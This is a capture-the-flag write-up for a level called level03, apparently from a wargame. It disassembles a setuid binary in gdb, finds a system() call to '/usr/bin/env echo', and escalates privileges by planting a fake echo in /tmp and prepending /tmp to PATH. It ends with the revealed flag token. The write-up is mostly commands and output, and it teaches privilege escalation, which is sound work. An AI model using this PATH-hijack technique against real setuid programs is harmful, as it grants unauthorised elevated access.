# First Search

```
$ id
uid=2003(level03) gid=2003(level03) groups=2003(level03),100(users)

$ ls -l
-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03

$ ./level03
Exploit me
```

# how to exploit this executable file

## use gdb to show code in asm

```
$ gdb level03

(gdb) disas main
Dump of assembler code for function main:
   0x080484a4 <+0>:     push   %ebp
   0x080484a5 <+1>:     mov    %esp,%ebp
   0x080484a7 <+3>:     and    $0xfffffff0,%esp
   0x080484aa <+6>:     sub    $0x20,%esp
   0x080484ad <+9>:     call   0x80483a0 <getegid@plt>
   0x080484b2 <+14>:    mov    %eax,0x18(%esp)
   0x080484b6 <+18>:    call   0x8048390 <geteuid@plt>
   0x080484bb <+23>:    mov    %eax,0x1c(%esp)
   0x080484bf <+27>:    mov    0x18(%esp),%eax
   0x080484c3 <+31>:    mov    %eax,0x8(%esp)
   0x080484c7 <+35>:    mov    0x18(%esp),%eax
   0x080484cb <+39>:    mov    %eax,0x4(%esp)
   0x080484cf <+43>:    mov    0x18(%esp),%eax
   0x080484d3 <+47>:    mov    %eax,(%esp)
   0x080484d6 <+50>:    call   0x80483e0 <setresgid@plt>
   0x080484db <+55>:    mov    0x1c(%esp),%eax
   0x080484df <+59>:    mov    %eax,0x8(%esp)
   0x080484e3 <+63>:    mov    0x1c(%esp),%eax
   0x080484e7 <+67>:    mov    %eax,0x4(%esp)
   0x080484eb <+71>:    mov    0x1c(%esp),%eax
   0x080484ef <+75>:    mov    %eax,(%esp)
   0x080484f2 <+78>:    call   0x8048380 <setresuid@plt>
   0x080484f7 <+83>:    movl   $0x80485e0,(%esp)
   0x080484fe <+90>:    call   0x80483b0 <system@plt>
   0x08048503 <+95>:    leave  
   0x08048504 <+96>:    ret    
End of assembler dump.

(gdb) x/s 0x80485e0
0x80485e0:       "/usr/bin/env echo Exploit me"
```
# Notes

there is a systemcall with argument : "/usr/bin/env echo Exploit me"

so we can modify the env var PATH to execute getflag as a wrong echo command

# Solution

## First, create a false echo command

```
$ echo "/bin/sh -c 'getflag'" > /tmp/echo
$ chmod 755 /tmp/echo
```

## Modify the path while adding false echo command at the beginning

```$ export PATH=/tmp:$PATH```

## Then 

```
$ ./level03
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```